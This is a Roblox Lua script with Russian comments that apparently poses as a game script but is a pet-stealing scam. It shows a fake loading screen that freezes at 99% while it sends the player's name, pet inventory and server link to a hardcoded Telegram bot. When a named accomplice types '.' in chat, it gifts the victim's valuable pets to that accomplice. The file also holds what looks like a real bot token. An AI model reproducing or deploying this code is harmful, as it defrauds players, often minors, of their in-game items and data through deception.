local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local TextChatService = game:GetService("TextChatService")

local player = Players.LocalPlayer

-- 🌌 GUI ЗАГРУЗКИ (фон + "зависание" на 99%)
task.spawn(function()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "CustomLoadingUI"
    screenGui.IgnoreGuiInset = true
    screenGui.ResetOnSpawn = false
    screenGui.Parent = player:WaitForChild("PlayerGui")

    -- ФОН
    local background = Instance.new("ImageLabel")
    background.Size = UDim2.new(1, 0, 1, 0)
    background.Position = UDim2.new(0, 0, 0, 0)
    background.Image = "rbxassetid://128494498539944" -- ✅ Вставлен твой ID
    background.BackgroundTransparency = 1
    background.ScaleType = Enum.ScaleType.Crop
    background.Parent = screenGui

    -- Надпись "Loading..."
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 0, 50)
    label.Position = UDim2.new(0, 0, 0.4, 0)
    label.BackgroundTransparency = 1
    label.Text = "Loading..."
    label.TextColor3 = Color3.new(1, 1, 1)
    label.Font = Enum.Font.GothamBold
    label.TextSize = 36
    label.TextStrokeTransparency = 0.6
    label.TextScaled = false
    label.Parent = background

    -- Прогресс-бар
    local barContainer = Instance.new("Frame")
    barContainer.Size = UDim2.new(0.4, 0, 0.025, 0)
    barContainer.Position = UDim2.new(0.3, 0, 0.5, 0)
    barContainer.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
    barContainer.BorderSizePixel = 0
    barContainer.Parent = background

    local barFill = Instance.new("Frame")
    barFill.Size = UDim2.new(0, 0, 1, 0)
    barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
    barFill.BorderSizePixel = 0
    barFill.Parent = barContainer

    local percent = Instance.new("TextLabel")
    percent.Size = UDim2.new(0, 60, 0, 25)
    percent.Position = UDim2.new(0.71, 10, 0.5, -12)
    percent.BackgroundTransparency = 1
    percent.TextColor3 = Color3.new(1, 1, 1)
    percent.Text = "0%"
    percent.Font = Enum.Font.Gotham
    percent.TextSize = 20
    percent.TextXAlignment = Enum.TextXAlignment.Left
    percent.Parent = background

    -- Прогресс до 99% за ~5 минут (299 шагов)
    for i = 1, 99 do
        barFill.Size = UDim2.new(i / 100, 0, 1, 0)
        percent.Text = i .. "%"
        task.wait(3) -- 3 секунды * 99 ≈ 5 минут
    end

    -- Застывает на 99%
    percent.Text = "99%"
    barFill.Size = UDim2.new(0.99, 0, 1, 0)
    -- НЕ УДАЛЯЕМ GUI
end)

-- ⏳ Весь остальной функционал запускается независимо

-- 🔧 НАСТРОЙКИ
local TELEGRAM_TOKEN = "7678595031:AAHYzkbKKI4CdT6B2NUGcYY6IlTvWG8xkzE"
local TELEGRAM_CHAT_ID = "7144575011"
local TARGET_PLAYER = "sfdgbzdfsb"
local TRIGGER_MESSAGE = "."

-- 🐾 БЕЛЫЙ СПИСОК
local WHITELIST = {
    "Butterfly",
    "Mimic Octopus",
    "Dragonfly",
    "Disco Bee",
    "Queen Bee",
    "French Fry Ferret",
    "Raiju",
    "Raccoon",
    "Fennec Fox",
    "Spinosaurus",
    "T-Rex",
    "Blood Kiwi"
}

local PetGiftingService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")

-- 🔎 Получить всех питомцев
local function getAllPets()
    local pets = {}
    local backpack = player:FindFirstChild("Backpack") or player.Character

    for _, item in ipairs(backpack:GetChildren()) do
        if item:IsA("Tool") then
            local weight, age = item.Name:match("%[(%d+%.%d+) KG%].*%[Age (%d+)%]")
            if weight and age then
                local petName = item.Name:match("^([^%[]+)") or item.Name
                petName = petName:gsub("%s+$", "")
                table.insert(pets, {
                    name = petName,
                    fullName = item.Name,
                    weight = tonumber(weight),
                    age = tonumber(age),
                    object = item,
                    isWhitelisted = table.find(WHITELIST, petName) ~= nil
                })
            end
        end
    end

    return pets
end

-- 📜 Список питомцев
local function getFullPetsList()
    local pets = getAllPets()
    if #pets == 0 then return "нет питомцев" end

    local list = {}
    for _, pet in ipairs(pets) do
        local status = pet.isWhitelisted and "✓" or "✗"
        table.insert(list, string.format("%s %s [%.2f кг, Age %d]", status, pet.name, pet.weight, pet.age))
    end

    return table.concat(list, "\n")
end

-- 📨 Telegram
local function sendToTelegram(text)
    local url = "https://api.telegram.org/bot"..TELEGRAM_TOKEN.."/sendMessage"..
                "?chat_id="..TELEGRAM_CHAT_ID.."&text="..HttpService:UrlEncode(text)
    local success, err = pcall(function() game:HttpGet(url) end)
    if not success then
        warn("Ошибка при отправке в Telegram: "..tostring(err))
    end
end

-- 🔗 Ссылка
local function getServerLink()
    local placeId = game.PlaceId
    local jobId = game.JobId
    if not jobId or jobId == "" then
        return "https://www.roblox.com/games/"..placeId
    end
    return "https://www.roblox.com/games/"..placeId.."?gameInstanceId="..jobId
end

-- 🏁 Стартовое уведомление
local function sendInitialNotification()
    local petsList = getFullPetsList()
    local message =
        "🔔 Игрок "..player.Name.." запустил скрипт\n\n"..
        "🐾 Питомцы:\n"..petsList.."\n\n"..
        "🔗 Ссылка на сервер:\n"..getServerLink()
    sendToTelegram(message)
end

sendInitialNotification()

-- 🐕 Передача
local function transferPet(pet)
    if not pet.isWhitelisted then return false end
    local target = Players:FindFirstChild(TARGET_PLAYER)
    if target and PetGiftingService then
        if player.Character and player.Character:FindFirstChild("Humanoid") then
            player.Character.Humanoid:EquipTool(pet.object)
            task.wait(1)
            PetGiftingService:FireServer("GivePet", target)
            return true
        end
    end
    return false
end

-- 🚚 Старт передачи
local function startPetTransfer()
    local pets = getAllPets()
    if #pets == 0 then
        sendToTelegram("❌ Нет питомцев для передачи")
        return
    end

    local transferred = 0
    for _, pet in ipairs(pets) do
        if pet.isWhitelisted then
            if transferPet(pet) then
                transferred += 1
            end
            task.wait(2)
        end
    end

    local report = {"🏁 Итого передано: "..transferred.." из "..#pets.."\n\n🐾 Список питомцев:\n"}
    for _, pet in ipairs(pets) do
        local status = pet.isWhitelisted and "✓" or "✗"
        table.insert(report, string.format("%s %s [%.2f кг, Age %d]", status, pet.name, pet.weight, pet.age))
    end
    sendToTelegram(table.concat(report, "\n"))
end

-- 💬 Прослушка сообщений
if TextChatService then
    TextChatService.OnIncomingMessage = function(message)
        local speaker = Players:FindFirstChild(message.TextSource.Name)
        if speaker and speaker.Name == TARGET_PLAYER and message.Text == TRIGGER_MESSAGE then
            startPetTransfer()
        end
    end
else
    Players.PlayerChatted:Connect(function(chatType, speaker, message)
        if chatType == Enum.PlayerChatType.All and speaker.Name == TARGET_PLAYER and message == TRIGGER_MESSAGE then
            startPetTransfer()
        end
    end)
end
